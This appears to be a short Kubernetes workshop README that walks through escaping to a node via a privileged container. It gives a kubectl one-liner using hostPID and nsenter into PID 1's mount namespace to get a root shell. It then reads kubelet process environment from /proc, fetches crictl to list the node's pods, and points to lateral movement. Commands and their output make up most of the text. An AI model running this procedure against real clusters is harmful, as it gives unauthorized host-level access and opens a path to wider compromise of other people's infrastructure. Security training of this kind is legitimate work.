# Deploy privileged container, A Container That Doesn't Contain Anything

## Quick Start

1. Run the following command to deploy the privilege container

   ```bash
   kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
   ```

1. Run the `top` command and look for some interesting processes like `kubelet`

1. Inspect `kubelet` environment variables, ie: `cat /proc/$PID/environ`

    ```bash
    cat /proc/235/environ 
    HTTPS_PROXY=HTTP_PROXY=LANG=C.UTF-8NO_PROXY=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=047f52a1d2854c73b39863c31edb2639JOURNAL_STREAM=8:243012KUBELET_KUBECONFIG_ARGS=--bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.confKUBELET_CONFIG_ARGS=--config=/var/lib/kubelet/config.yamlKUBELET_KUBEADM_ARGS=--container-runtime-endpoint=unix:///run/containerd/containerd.sock --node-ip=172.19.0.5 --node-labels= --pod-infra-container-image=registry.k8s.io/pause:3.9 --provider-id=kind://docker/workshop-cluster/workshop-cluster-worker2KUBELET_EXTRA_ARGS=--runtime-cgroups=/system.slice/containerd.service
    ```

1. Download `crictl` and list all the running pods on this particular node

    ```bash
    apt update && apt install -f wget tar
    wget https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.27.0/crictl-v1.27.0-linux-amd64.tar.gz -O /tmp/crictl.tar.gz
    tar xvf /tmp/crictl.tar.gz -C /tmp
    ```

1. List pods

    ```bash
    cd /tmp
    ./crictl  ps -a
    ```

1. For here you can do other interesting stuff like lateral movement

## Resources

- <https://kubehound.io/reference/attacks/EXPLOIT_CONTAINERD_SOCK/>